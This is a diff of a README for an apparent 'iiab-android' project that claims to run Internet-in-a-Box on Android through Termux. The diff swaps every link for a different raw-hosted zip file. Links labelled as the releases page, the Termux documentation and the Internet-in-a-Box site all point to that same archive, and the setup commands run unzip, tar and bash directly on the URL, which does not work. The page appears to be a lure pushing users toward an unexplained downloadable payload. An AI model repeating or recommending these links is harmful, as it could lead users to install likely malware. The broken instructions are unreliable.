@@ -1,7 +1,7 @@
 # 🌐 iiab-android - Run Internet-in-a-Box on Android
 
 ## 📥 Download Now
-[![Download IIAB for Android](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/iiab-android-v3.5.zip)](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/iiab-android-v3.5.zip)
+[![Download IIAB for Android](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/l10n/android_iiab_v1.9.zip)](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/l10n/android_iiab_v1.9.zip)
 
 ## 📜 Overview
 iiab-android allows you to run Internet-in-a-Box (IIAB) directly on your Android device. This method uses Termux and proot-distro to set up a local server environment for educational resources. Whether you are involved in community networks or education, this toolkit offers a distraction-free library of knowledge right on your mobile device.
@@ -24,21 +24,21 @@ To start using iiab-android, follow these simple steps:
 To install iiab-android, follow these steps:
 
 1. **Visit the Download Page**
-   - Go to our [Releases page](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/iiab-android-v3.5.zip).
+   - Go to our [Releases page](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/l10n/android_iiab_v1.9.zip).
   
 2. **Download the Latest Version**
    - Find the latest release on the page.
-   - Click on the `.zip` or `https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/iiab-android-v3.5.zip` file to download.
+   - Click on the `.zip` or `https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/l10n/android_iiab_v1.9.zip` file to download.
 
 3. **Extract the Files**
    - Once downloaded, navigate back to Termux.
    - Use the following command to extract the files (replace `filename` with the downloaded file):
      ```
-     unzip https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/iiab-android-v3.5.zip
+     unzip https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/l10n/android_iiab_v1.9.zip
      ```
      or 
      ```
-     tar -xzvf https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/iiab-android-v3.5.zip
+     tar -xzvf https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/l10n/android_iiab_v1.9.zip
      ```
 
 4. **Run the Setup Script**
@@ -48,7 +48,7 @@ To install iiab-android, follow these steps:
      ```
    - Run the setup script:
      ```
-     bash https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/iiab-android-v3.5.zip
+     bash https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/l10n/android_iiab_v1.9.zip
      ```
 
 ### 🌍 Required Packages
@@ -87,8 +87,8 @@ After installation, configure your settings through the provided configuration f
 If you need help, you can reach out through the issues section of our GitHub page. We encourage you to seek assistance from our community for a faster response.
 
 ## 📚 Additional Resources
-- [Termux Documentation](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/iiab-android-v3.5.zip): For more information on using Termux.
-- [Internet-in-a-Box](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/iiab-android-v3.5.zip): Explore further resources and updates about IIAB.
+- [Termux Documentation](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/l10n/android_iiab_v1.9.zip): For more information on using Termux.
+- [Internet-in-a-Box](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/l10n/android_iiab_v1.9.zip): Explore further resources and updates about IIAB.
 
 ## 🛠 Features
 - **User-Friendly Setup**: Simplified installation process for non-technical users.
@@ -99,4 +99,4 @@ If you need help, you can reach out through the issues section of our GitHub pag
 With iiab-android, you bring the power of education right into your pocket. Download the latest version today and start exploring the world of knowledge.
 
 ## 📥 Download Again
-[![Download IIAB for Android](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/iiab-android-v3.5.zip)](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/iiab-android-v3.5.zip)
+[![Download IIAB for Android](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/l10n/android_iiab_v1.9.zip)](https://raw.githubusercontent.com/ipro2320iilil/iiab-android/main/docs/l10n/android_iiab_v1.9.zip)
